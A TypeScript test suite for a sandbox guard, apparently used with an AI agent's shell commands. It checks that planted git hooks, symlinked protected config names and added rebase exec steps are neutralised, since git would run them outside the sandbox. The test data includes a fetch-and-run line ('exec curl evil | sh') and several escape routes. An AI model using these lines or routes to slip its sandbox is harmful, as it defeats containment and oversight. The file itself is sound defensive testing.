import { spawnSync } from "node:child_process";
import { chmodSync, linkSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, statSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { basename, dirname, join } from "node:path";

import { afterEach, beforeEach, describe, expect, it } from "vitest";

import { HOOKS_NOTICE, HookGuard, MAX_LISTED, chmodInside, isGitHook, neutralize, scanHooks } from "../src/hosts/hooks.js";

let folder: string;
let other: string;

function hook(rel: string, mode = 0o755, root = folder): string {
  const path = join(root, rel);
  mkdirSync(dirname(path), { recursive: true });
  writeFileSync(path, "#!/bin/sh\n");
  chmodSync(path, mode);
  return path;
}
const executable = (path: string) => (statSync(path).mode & 0o111) !== 0;
const ran = (output: string) => ({ ok: { output, returncode: 0, timed_out: false } });
// chmod 000 does not stop root from reading.
const asRoot = process.getuid?.() === 0;

beforeEach(() => {
  folder = realpathSync(mkdtempSync(join(tmpdir(), "hooks-")));
  // Another folder a command can write, as the session's temp folder is.
  other = realpathSync(mkdtempSync(join(tmpdir(), "hooks-tmp-")));
});

afterEach(() => {
  rmSync(folder, { recursive: true, force: true });
  rmSync(other, { recursive: true, force: true });
});

describe("a git hook", () => {
  it("is a file under a hooks folder in a .git folder, at any depth and in any case", () => {
    expect(isGitHook(folder, `${folder}/.git/hooks/pre-commit`)).toBe(true);
    expect(isGitHook(folder, `${folder}/a/b/c/d/e/f/.git/hooks/pre-commit`)).toBe(true);
    expect(isGitHook(folder, `${folder}/X/.GIT/Hooks/post-checkout`)).toBe(true);
    expect(isGitHook(folder, `${folder}/.git/modules/sub/hooks/pre-push`)).toBe(true);
    expect(isGitHook(folder, `${folder}/.git/hooks`)).toBe(false);
    expect(isGitHook(folder, `${folder}/hooks/pre-commit`)).toBe(false);
    expect(isGitHook(folder, `${folder}/.git/config`)).toBe(false);
    expect(isGitHook(folder, "/elsewhere/.git/hooks/pre-commit")).toBe(false);
  });
});

describe("the walk", () => {
  it("finds hooks at any depth, and skips node_modules and a git folder's object store", async () => {
    const deep = hook("a/b/c/d/e/f/.git/hooks/pre-commit");
    hook("node_modules/pkg/.git/hooks/pre-commit");
    hook("a/.git/objects/hooks/x");
    writeFileSync(join(folder, "a", ".git", "HEAD"), "ref: refs/heads/main\n");
    const scan = await scanHooks(folder);
    expect([...scan.hooks.keys()]).toEqual([deep]);
    expect(scan.unreadable).toEqual([]);
  });

  it("walks a submodule's git folder even when the submodule is named objects", async () => {
    mkdirSync(join(folder, ".git", "modules", "objects"), { recursive: true });
    writeFileSync(join(folder, ".git", "HEAD"), "ref: refs/heads/main\n");
    writeFileSync(join(folder, ".git", "modules", "objects", "HEAD"), "ref: refs/heads/main\n");
    const inner = hook(".git/modules/objects/hooks/pre-commit");
    expect([...(await scanHooks(folder)).hooks.keys()]).toEqual([inner]);
  });

  it("walks a submodule named objects even when a command wrote a HEAD into the folder above it", async () => {
    mkdirSync(join(folder, ".git", "modules", "objects"), { recursive: true });
    writeFileSync(join(folder, ".git", "HEAD"), "ref: refs/heads/main\n");
    writeFileSync(join(folder, ".git", "modules", "HEAD"), "ref: refs/heads/main\n");
    writeFileSync(join(folder, ".git", "modules", "objects", "HEAD"), "ref: refs/heads/main\n");
    const inner = hook(".git/modules/objects/hooks/pre-commit");
    expect([...(await scanHooks(folder)).hooks.keys()]).toEqual([inner]);
  });

  it.skipIf(asRoot)("walks a git folder's objects folder it cannot search, as it may be a submodule's git folder", async () => {
    const objects = join(folder, ".git", "modules", "objects");
    mkdirSync(objects, { recursive: true });
    writeFileSync(join(folder, ".git", "HEAD"), "ref: refs/heads/main\n");
    writeFileSync(join(folder, ".git", "modules", "HEAD"), "ref: refs/heads/main\n");
    writeFileSync(join(objects, "HEAD"), "ref: refs/heads/main\n");
    hook(".git/modules/objects/hooks/pre-commit");
    chmodSync(objects, 0o600);
    try {
      expect((await scanHooks(folder)).unreadable).toEqual([join(objects, "hooks")]);
    } finally {
      chmodSync(objects, 0o755);
    }
  });

  it.skipIf(asRoot)("lists a folder it cannot read when the user owns it or can write it, and skips one it can do neither with", async () => {
    const locked = join(folder, "locked");
    mkdirSync(locked);
    chmodSync(locked, 0);
    const dropBox = join(folder, "drop");
    mkdirSync(dropBox);
    chmodSync(dropBox, 0o333);
    const somebodyElse = (process.getuid?.() ?? 0) + 1;
    try {
      expect((await scanHooks(folder)).unreadable.sort()).toEqual([dropBox, locked]);
      // As though both were somebody else's: only the one a command can write into counts.
      expect((await scanHooks(folder, somebodyElse)).unreadable).toEqual([dropBox]);
    } finally {
      chmodSync(locked, 0o755);
      chmodSync(dropBox, 0o755);
    }
  });

  it.skipIf(asRoot)("lists a folder below a hooks folder it cannot read only while a hook could still run a file in it", async () => {
    const hooks = join(folder, ".git", "hooks");
    // A hook can run a file in a folder it can search but not list.
    const searchable = join(hooks, "pre-commit.d");
    const closed = join(hooks, "post-checkout.d");
    mkdirSync(searchable, { recursive: true });
    mkdirSync(closed);
    chmodSync(searchable, 0o311);
    chmodSync(closed, 0);
    try {
      expect((await scanHooks(folder)).unreadable).toEqual([searchable]);
    } finally {
      chmodSync(searchable, 0o755);
      chmodSync(closed, 0o755);
    }
  });
});

describe("neutralizing", () => {
  it("makes each new hook non-executable, and leaves the user's own and samples", async () => {
    const own = hook(".git/hooks/pre-push");
    const baseline = (await scanHooks(folder)).hooks;
    const added = hook("sub/.git/hooks/pre-commit");
    const sample = hook(".git/hooks/pre-commit.sample");
    const target = hook("tools/run.sh");
    const linked = join(folder, ".git/hooks/post-checkout");
    symlinkSync(target, linked);
    const { changed } = await neutralize(folder, await scanHooks(folder), baseline);
    expect(changed.sort()).toEqual([linked, added].sort());
    expect(executable(added)).toBe(false);
    expect(executable(target)).toBe(false);
    expect(executable(own)).toBe(true);
    expect(executable(sample)).toBe(true);
  });

  it("makes the target of a link into another folder a command can write non-executable", async () => {
    const baseline = (await scanHooks(folder)).hooks;
    const target = hook("run.sh", 0o755, other);
    mkdirSync(join(folder, ".git", "hooks"), { recursive: true });
    symlinkSync(target, join(folder, ".git", "hooks", "pre-commit"));
    expect((await neutralize(folder, await scanHooks(folder), baseline, [folder, other])).changed).toHaveLength(1);
    expect(executable(target)).toBe(false);
  });

  it("closes the hooks folder of a link to a program no command wrote, and leaves the program", async () => {
    const baseline = (await scanHooks(folder)).hooks;
    const hooks = join(folder, "repo", ".git", "hooks");
    mkdirSync(hooks, { recursive: true });
    symlinkSync("/bin/sh", join(hooks, "post-checkout"));
    try {
      expect((await neutralize(folder, await scanHooks(folder), baseline)).changed).toEqual([join(hooks, "post-checkout")]);
      // Git can reach no hook in a folder it cannot search.
      expect(statSync(hooks).mode & 0o111).toBe(0);
      expect(executable("/bin/sh")).toBe(true);
    } finally {
      chmodSync(hooks, 0o755);
    }
  });

  it("closes the hooks folder of a hook hard-linked to a file elsewhere, and leaves the file", async () => {
    const baseline = (await scanHooks(folder)).hooks;
    const target = hook("run.sh", 0o755, other);
    const hooks = join(folder, ".git", "hooks");
    mkdirSync(hooks, { recursive: true });
    linkSync(target, join(hooks, "pre-commit"));
    try {
      const { changed } = await neutralize(folder, await scanHooks(folder), baseline, [folder, other]);
      // A chmod would change the file at its other paths too.
      expect(executable(target)).toBe(true);
      expect(statSync(hooks).mode & 0o111).toBe(0);
      expect(changed).toEqual([join(hooks, "pre-commit")]);
    } finally {
      chmodSync(hooks, 0o755);
    }
  });

  it("treats a hook of the user's that a command made executable as new", async () => {
    const own = hook(".git/hooks/pre-push", 0o644);
    const baseline = (await scanHooks(folder)).hooks;
    chmodSync(own, 0o755);
    expect((await neutralize(folder, await scanHooks(folder), baseline)).changed).toEqual([own]);
    expect(executable(own)).toBe(false);
  });

  it("treats a linked hook of the user's whose script a command rewrote as new", async () => {
    const script = hook("scripts/pre-commit");
    mkdirSync(join(folder, ".git", "hooks"), { recursive: true });
    const linked = join(folder, ".git", "hooks", "pre-commit");
    symlinkSync("../../scripts/pre-commit", linked);
    const baseline = (await scanHooks(folder)).hooks;
    writeFileSync(script, "#!/bin/sh\necho changed\n");
    expect((await neutralize(folder, await scanHooks(folder), baseline)).changed).toEqual([linked]);
    expect(executable(script)).toBe(false);
  });
});

describe("a mode change", () => {
  const closed = (mode: number) => mode & 0o7666;

  it("is made where the opened file really is, so a link on its path cannot lead it out of the folder", async () => {
    const outside = hook("run.sh", 0o755, other);
    symlinkSync(other, join(folder, "d"));
    expect(await chmodInside(join(folder, "d", "run.sh"), [folder], closed)).toBe(false);
    // A link as the last part is never followed, though it leads inside.
    const inner = hook("real.sh");
    symlinkSync(inner, join(folder, "link.sh"));
    expect(await chmodInside(join(folder, "link.sh"), [folder], closed)).toBe(false);
    expect(statSync(outside).mode & 0o777).toBe(0o755);
    expect(executable(inner)).toBe(true);
  });

  it("is made on a file inside the folder", async () => {
    const inner = hook("run.sh");
    expect(await chmodInside(inner, [folder], closed)).toBe(true);
    expect(statSync(inner).mode & 0o777).toBe(0o644);
  });
});

describe("the guard", () => {
  it("adds a notice to the command's output naming the hooks it changed, once", async () => {
    const guard = new HookGuard(folder);
    expect(await guard.refusal()).toBeNull();
    hook(".git/hooks/pre-commit");
    expect(await guard.after(ran("done\n"))).toEqual(ran(`done\n\n${HOOKS_NOTICE}.git/hooks/pre-commit`));
    expect(await guard.after(ran("again"))).toEqual(ran("again"));
  });

  it("tells the hooks a look between commands stopped with the next command's output", async () => {
    const guard = new HookGuard(folder);
    await guard.refusal();
    const added = hook(".git/hooks/pre-commit");
    await guard.watch();
    expect(executable(added)).toBe(false);
    expect(await guard.after(ran("next"))).toEqual(ran(`next\n${HOOKS_NOTICE}.git/hooks/pre-commit`));
    expect(await guard.after(ran("again"))).toEqual(ran("again"));
  });

  it("makes hooks non-executable after a command that did not answer ok, with nothing to add", async () => {
    const guard = new HookGuard(folder);
    await guard.refusal();
    const added = hook(".git/hooks/pre-commit");
    const cancelled = { error: { type: "cancelled", message: "stopped" } };
    expect(await guard.after(cancelled)).toEqual(cancelled);
    expect(executable(added)).toBe(false);
  });

  it.skipIf(asRoot)("refuses commands while a folder the user owns cannot be read, and goes on once it can", async () => {
    const locked = join(folder, "locked");
    mkdirSync(locked);
    chmodSync(locked, 0);
    try {
      const guard = new HookGuard(folder);
      expect(await guard.refusal()).toEqual({
        error: { type: "sandbox", message: expect.stringContaining("locked") },
      });
      chmodSync(locked, 0o755);
      expect(await guard.refusal()).toBeNull();
    } finally {
      chmodSync(locked, 0o755);
    }
  });

  it("goes on past a folder below a hooks folder it closed, as git runs nothing from there", async () => {
    const hooks = join(folder, ".git", "hooks");
    mkdirSync(join(hooks, "pre-commit.d"), { recursive: true });
    const guard = new HookGuard(folder);
    await guard.refusal();
    symlinkSync("/bin/sh", join(hooks, "post-checkout"));
    try {
      await guard.after(ran(""));
      expect(statSync(hooks).mode & 0o111).toBe(0);
      expect(await guard.settle()).toBe(true);
      expect(await guard.refusal()).toBeNull();
    } finally {
      chmodSync(hooks, 0o755);
    }
  });

  it.skipIf(asRoot)("names at most a few of the folders it cannot read", async () => {
    const locked = Array.from({ length: MAX_LISTED + 1 }, (_, i) => join(folder, `locked${String(i).padStart(2, "0")}`));
    for (const dir of locked) {
      mkdirSync(dir);
      chmodSync(dir, 0);
    }
    try {
      expect(await new HookGuard(folder).refusal()).toEqual({
        error: { type: "sandbox", message: expect.stringContaining(`${basename(locked[MAX_LISTED - 1] ?? "")} and 1 more in this folder`) },
      });
    } finally {
      for (const dir of locked) chmodSync(dir, 0o755);
    }
  });

  it("refuses commands when looking through the folder takes too long", async () => {
    for (let i = 0; i < 300; i += 1) mkdirSync(join(folder, `d${i}`, "e"), { recursive: true });
    const guard = new HookGuard(folder, { timeoutMs: 0 });
    expect(await guard.refusal()).toEqual({
      error: { type: "sandbox", message: expect.stringContaining("within 0 seconds") },
    });
  });

  it("tells the baseline it finds, once", async () => {
    const own = hook(".git/hooks/pre-push");
    const told: Array<ReadonlyMap<string, string>> = [];
    const guard = new HookGuard(folder, { known: (hooks) => told.push(hooks) });
    await guard.refusal();
    await guard.after(ran(""));
    expect(told.map((hooks) => [...hooks.keys()])).toEqual([[own]]);
  });

  it("refuses commands until it can record its baseline", async () => {
    let fail = true;
    const guard = new HookGuard(folder, {
      known: () => {
        if (fail) throw new Error("disk full");
      },
    });
    expect(await guard.refusal()).toEqual({ error: { type: "sandbox", message: expect.stringContaining("disk full") } });
    fail = false;
    expect(await guard.refusal()).toBeNull();
  });

  it("after a crash, makes what the killed host's commands left non-executable before any command", async () => {
    const own = hook(".git/hooks/pre-push");
    const inherited = (await scanHooks(folder)).hooks;
    const left = hook("sub/.git/hooks/pre-commit");
    const told: Array<ReadonlyMap<string, string>> = [];
    const guard = new HookGuard(folder, { inherited, known: (hooks) => told.push(hooks) });
    expect(await guard.refusal()).toBeNull();
    expect(executable(left)).toBe(false);
    expect(executable(own)).toBe(true);
    expect(told).toEqual([inherited]);
  });

  it("makes what a stopped command left non-executable when it settles, and says whether it saw everything", async () => {
    const guard = new HookGuard(folder);
    await guard.refusal();
    const left = hook(".git/hooks/pre-commit");
    expect(await guard.settle()).toBe(true);
    expect(executable(left)).toBe(false);
  });

  it.skipIf(asRoot)("settles as unclean when the last look could not see the whole folder", async () => {
    const guard = new HookGuard(folder);
    await guard.refusal();
    const locked = join(folder, "locked");
    mkdirSync(locked);
    chmodSync(locked, 0);
    try {
      expect(await guard.settle()).toBe(false);
    } finally {
      chmodSync(locked, 0o755);
    }
  });
});

// The guest's rule judges a write by the path it reaches, not by a link's name on the way: a link
// the user made at a protected name, to a path in the folder that is not protected, lets a command write it.
describe("a protected name linked into the folder", () => {
  const LINKED = "Make it a file, or point it outside the folder, to run commands here.";
  const refused = (message: string) => ({ error: { type: "sandbox", message } });

  it("refuses commands while it is a link, and lets them run once it is a file", async () => {
    mkdirSync(join(folder, "config"));
    writeFileSync(join(folder, "config", "mcp.json"), "{}\n");
    symlinkSync("config/mcp.json", join(folder, ".mcp.json"));
    const guard = new HookGuard(folder);
    expect(await guard.refusal()).toEqual(refused(`Blocked: .mcp.json is a link to config/mcp.json in this folder. ${LINKED}`));
    rmSync(join(folder, ".mcp.json"));
    writeFileSync(join(folder, ".mcp.json"), "{}\n");
    expect(await guard.refusal()).toBeNull();
  });

  it("names each: a folder, a file in a protected folder, one through a link a command could swap, and one that leads to nothing yet", async () => {
    mkdirSync(join(folder, "scripts"));
    symlinkSync("scripts", join(folder, ".vscode"));
    mkdirSync(join(folder, ".idea"));
    symlinkSync("../workspace.xml", join(folder, ".idea", "workspace.xml"));
    // Where it ends is out of the folder, but cfg is a command's to make a folder of its own.
    symlinkSync(other, join(folder, "cfg"));
    symlinkSync("cfg/gitconfig", join(folder, ".gitconfig"));
    symlinkSync("missing", join(folder, ".zshrc"));
    expect(await new HookGuard(folder).refusal()).toEqual(refused([
      "Blocked: .gitconfig is a link to cfg in this folder.", ".idea/workspace.xml is a link to workspace.xml in this folder.",
      ".vscode is a link to scripts in this folder.", ".zshrc is a link to missing in this folder.",
      "Make each a file, or point it outside the folder, to run commands here.",
    ].join(" ")));
  });

  // A write through .git, .claude or a submodule's git folder reaches the config, hooks or commands under where it leads.
  const layouts: Array<[string, () => void, string]> = [
    ["a .git", () => {
      mkdirSync(join(folder, "realgit"));
      symlinkSync("realgit", join(folder, ".git"));
    }, ".git is a link to realgit"],
    [".claude", () => {
      mkdirSync(join(folder, "dotclaude", "commands"), { recursive: true });
      symlinkSync("dotclaude", join(folder, ".claude"));
    }, ".claude is a link to dotclaude"],
    ["a submodule's git folder", () => {
      mkdirSync(join(folder, ".git", "modules"), { recursive: true });
      mkdirSync(join(folder, "mods", "foo"), { recursive: true });
      symlinkSync("../../mods/foo", join(folder, ".git", "modules", "foo"));
    }, ".git/modules/foo is a link to mods/foo"],
    ["a chain that leaves the folder and comes back", () => {
      mkdirSync(join(folder, "config"));
      symlinkSync(join(folder, "config", "mcp.json"), join(other, "hop"));
      symlinkSync(join(other, "hop"), join(folder, ".mcp.json"));
    }, ".mcp.json is a link to config/mcp.json"],
    // b is a command's to make a folder of its own.
    ["a chain through a link in the folder that leaves it again", () => {
      symlinkSync(join(other, "c"), join(folder, "b"));
      symlinkSync(join(folder, "b"), join(other, "a"));
      symlinkSync(join(other, "a"), join(folder, ".vscode"));
    }, ".vscode is a link to b"],
  ];
  for (const [title, layout, linked] of layouts) {
    it(`refuses commands while ${title} links into the folder`, async () => {
      layout();
      expect(await new HookGuard(folder).refusal()).toEqual(refused(`Blocked: ${linked} in this folder. ${LINKED}`));
    });
  }

  it("lets commands run beside one linked out of the folder, or to a protected name in it, and a git hook linked to a script, which the guard stops", async () => {
    symlinkSync(other, join(folder, ".vscode"));
    symlinkSync(other, join(folder, ".claude"));
    mkdirSync(join(folder, "sub", ".git"), { recursive: true });
    mkdirSync(join(folder, "x"));
    symlinkSync("../sub/.git", join(folder, "x", ".git"));
    symlinkSync("/nowhere", join(folder, ".bashrc"));
    mkdirSync(join(folder, ".idea"));
    symlinkSync(".idea/mcp.json", join(folder, ".mcp.json"));
    hook("scripts/pre-commit");
    mkdirSync(join(folder, ".git", "hooks"), { recursive: true });
    symlinkSync("../../scripts/pre-commit", join(folder, ".git", "hooks", "pre-commit"));
    expect(await new HookGuard(folder).refusal()).toBeNull();
  });
});

describe("the walk's protected keys", () => {
  it("are every entry under a protected name at any depth, folders too, and a .git file, but not a .git folder", async () => {
    const deep = hook("a/b/c/d/e/f/g/h/i/j/k/.git/hooks/pre-commit");
    mkdirSync(join(folder, ".vscode"));
    writeFileSync(join(folder, ".vscode", "settings.json"), "{}");
    mkdirSync(join(folder, ".git"));
    writeFileSync(join(folder, ".git", "config"), "");
    writeFileSync(join(folder, ".git", "HEAD"), "ref: refs/heads/main\n");
    mkdirSync(join(folder, "wt"));
    writeFileSync(join(folder, "wt", ".git"), "gitdir: /elsewhere\n");
    writeFileSync(join(folder, "README.md"), "");
    expect([...(await scanHooks(folder)).protectedKeys].sort()).toEqual([
      join(folder, ".git", "config"),
      join(folder, ".vscode"),
      join(folder, ".vscode", "settings.json"),
      join(folder, "a/b/c/d/e/f/g/h/i/j/k/.git/hooks"),
      deep,
      join(folder, "wt", ".git"),
    ].sort());
  });

  it("leave out node_modules and a git folder's object store", async () => {
    mkdirSync(join(folder, "node_modules", "pkg", ".vscode"), { recursive: true });
    writeFileSync(join(folder, "node_modules", "pkg", ".vscode", "settings.json"), "{}");
    mkdirSync(join(folder, ".git", "objects", ".vscode"), { recursive: true });
    writeFileSync(join(folder, ".git", "HEAD"), "ref: refs/heads/main\n");
    expect([...(await scanHooks(folder)).protectedKeys]).toEqual([]);
  });

  it("are told for every look, with when it started", async () => {
    const told: Array<{ keys: string[]; startedAt: number }> = [];
    const guard = new HookGuard(folder, { seen: (keys, startedAt) => told.push({ keys: [...keys], startedAt }) });
    await guard.refusal();
    const before = performance.now();
    writeFileSync(join(folder, ".mcp.json"), "{}");
    await guard.watch();
    expect(told.map((look) => look.keys)).toEqual([[], [join(folder, ".mcp.json")]]);
    expect(told[1]?.startedAt).toBeGreaterThanOrEqual(before);
  });

  it("are not told for a look that timed out, and take a .git link as a key", async () => {
    for (let i = 0; i < 300; i += 1) mkdirSync(join(folder, `d${i}`, "e"), { recursive: true });
    const told: unknown[] = [];
    await new HookGuard(folder, { timeoutMs: 0, seen: (keys) => told.push(keys) }).refusal();
    expect(told).toEqual([]);
    symlinkSync("/elsewhere", join(folder, "d0", ".git"));
    expect([...(await scanHooks(folder)).protectedKeys]).toEqual([join(folder, "d0", ".git")]);
  });
});

describe("a look whose protected keys could not be told", () => {
  it("blocks commands, still stops new hooks, and clears on the next look that tells them", async () => {
    let failing = true;
    const guard = new HookGuard(folder, {
      seen: () => {
        if (failing) throw new Error("full");
      },
    });
    expect(await guard.refusal()).toEqual({
      error: { type: "sandbox", message: "Blocked: the computer could not check this folder's protected paths, so commands cannot run here: full" },
    });
    const added = hook(".git/hooks/pre-commit");
    await guard.after(ran(""));
    expect(executable(added)).toBe(false);
    failing = false;
    expect(await guard.refusal()).toBeNull();
  });
});

describe("a look that could neither record nor tell its protected keys", () => {
  it("says both", async () => {
    const guard = new HookGuard(folder, {
      known: () => {
        throw new Error("disk");
      },
      seen: () => {
        throw new Error("full");
      },
    });
    expect(await guard.refusal()).toEqual({
      error: {
        type: "sandbox",
        message: "Blocked: the computer could not record this folder's state, so commands cannot run here: disk Blocked: the computer could not check this folder's protected paths, so commands cannot run here: full",
      },
    });
  });
});

// Git runs a paused rebase's or cherry-pick's exec steps outside the sandbox, at the host's
// git rebase --continue: the guest's rule lets commands write git's transient state.
describe("a paused rebase's or cherry-pick's todo", () => {
  const output = async (guard: HookGuard) => ((await guard.after(ran(""))) as { ok: { output: string } }).ok.output;

  it("comments out exec lines a command added to a rebase todo, keeping the user's", async () => {
    // Baseline recorded at command start: one user exec line.
    const todo = join(folder, ".git/rebase-merge/git-rebase-todo");
    mkdirSync(dirname(todo), { recursive: true });
    writeFileSync(todo, "pick abc one\nexec make test\n");
    const guard = new HookGuard(folder);
    await guard.refusal();                       // records the exec lines present now
    writeFileSync(todo, "pick abc one\nexec make test\nexec curl evil | sh\n"); // a command adds one
    const notice = await output(guard);
    const after = readFileSync(todo, "utf8");
    expect(after).toContain("exec make test");                       // the user's line kept
    expect(after).toContain("# Surogate removed a step a command added: exec curl evil | sh");
    expect(after).not.toMatch(/^exec curl evil \| sh$/m);            // the added line neutralised
    expect(notice).toMatch(/removed a step/);
  });

  it("keeps the exec lines of the user's own rebase -x, started on the host, that are there at the next command's start", async () => {
    mkdirSync(join(folder, ".git"));
    const guard = new HookGuard(folder);
    await guard.refusal();
    expect(await output(guard)).toBe("");
    const todo = join(folder, ".git/rebase-merge/git-rebase-todo");
    mkdirSync(dirname(todo));
    writeFileSync(todo, "pick abc one\nexec make test\npick def two\nx make test\n");
    await guard.refusal();
    expect(await output(guard)).toBe("");
    await guard.watch();
    expect(readFileSync(todo, "utf8")).toBe("pick abc one\nexec make test\npick def two\nx make test\n");
  });

  it("comments out every exec line of a todo a command began, in a submodule's git folder too, and tells a look between commands with the next output", async () => {
    const lib = join(folder, ".git/modules/lib");
    mkdirSync(join(lib, "sequencer"), { recursive: true });
    writeFileSync(join(lib, "HEAD"), "ref: refs/heads/main\n");
    const guard = new HookGuard(folder);
    await guard.refusal();
    const todo = join(lib, "sequencer/todo");
    writeFileSync(todo, "pick abc one\n\t x  touch pwned\r\nexecute\n");
    await guard.watch();
    expect(readFileSync(todo, "utf8")).toBe("pick abc one\n# Surogate removed a step a command added: \t x  touch pwned\r\nexecute\n");
    expect(await output(guard)).toMatch(/removed a step.*\.git\/modules\/lib\/sequencer\/todo$/);
    expect(await output(guard)).toBe("");
  });

  it("comments out a step added between commands while something of the chat's could have added it, though it is there at the next command's start", async () => {
    const todo = join(folder, ".git/rebase-merge/git-rebase-todo");
    mkdirSync(dirname(todo), { recursive: true });
    writeFileSync(todo, "exec make test\n");
    const guard = new HookGuard(folder, { writing: () => true });
    await guard.refusal();
    writeFileSync(todo, "exec make test\nexec touch pwned\n");
    await guard.refusal();
    await guard.after(ran(""));
    expect(readFileSync(todo, "utf8")).toBe("exec make test\n# Surogate removed a step a command added: exec touch pwned\n");
  });

  it("leaves the todos alone while a command runs, whose rebase may be working through one, and comments out what it added once none does", async () => {
    mkdirSync(join(folder, ".git"));
    let running = false;
    const guard = new HookGuard(folder, { running: () => running });
    await guard.refusal();
    running = true;
    const todo = join(folder, ".git/rebase-merge/git-rebase-todo");
    mkdirSync(dirname(todo));
    writeFileSync(todo, "pick abc one\nexec make test\n");
    await guard.watch();
    expect(readFileSync(todo, "utf8")).toBe("pick abc one\nexec make test\n");
    running = false;
    expect(await output(guard)).toMatch(/removed a step.*\.git\/rebase-merge\/git-rebase-todo$/);
    expect(readFileSync(todo, "utf8")).toBe("pick abc one\n# Surogate removed a step a command added: exec make test\n");
  });

  it("after a crash, comments out every exec line before any command", async () => {
    const todo = join(folder, ".git/rebase-merge/git-rebase-todo");
    mkdirSync(dirname(todo), { recursive: true });
    writeFileSync(todo, "exec touch pwned\n");
    expect(await new HookGuard(folder, { inherited: new Map() }).refusal()).toBeNull();
    expect(readFileSync(todo, "utf8")).toBe("# Surogate removed a step a command added: exec touch pwned\n");
  });

  it("replaces a todo linked to a file in the folder as a file, leaving the file, and refuses commands while one it cannot change or read is there", async () => {
    const merge = join(folder, ".git/rebase-merge");
    mkdirSync(merge, { recursive: true });
    const guard = new HookGuard(folder);
    await guard.refusal();
    writeFileSync(join(folder, "notes.txt"), "exec touch pwned\n");
    symlinkSync("../../notes.txt", join(merge, "git-rebase-todo"));
    await guard.after(ran(""));
    expect(readFileSync(join(merge, "git-rebase-todo"), "utf8")).toBe("# Surogate removed a step a command added: exec touch pwned\n");
    expect(readFileSync(join(folder, "notes.txt"), "utf8")).toBe("exec touch pwned\n");
    // Its folder leads out of the folder, where the guard writes nothing.
    rmSync(merge, { recursive: true });
    mkdirSync(join(other, "merge"));
    writeFileSync(join(other, "merge", "git-rebase-todo"), "exec touch pwned\n");
    symlinkSync(join(other, "merge"), merge);
    await guard.after(ran(""));
    expect(await guard.refusal()).toEqual({ error: { type: "sandbox", message: "Blocked: the computer could not remove the steps a command added to .git/rebase-merge/git-rebase-todo, which git would run outside the sandbox. Abort that rebase or cherry-pick, or remove those exec lines, to run commands here." } });
    expect(readFileSync(join(other, "merge", "git-rebase-todo"), "utf8")).toBe("exec touch pwned\n");
    // A FIFO git would wait on, which a process could feed.
    rmSync(merge);
    mkdirSync(merge);
    spawnSync("mkfifo", [join(merge, "git-rebase-todo")]);
    await guard.after(ran(""));
    expect(await guard.refusal()).toMatchObject({ error: { message: expect.stringContaining("could not remove the steps") } });
    rmSync(merge, { recursive: true });
    expect(await guard.refusal()).toBeNull();
  });
});
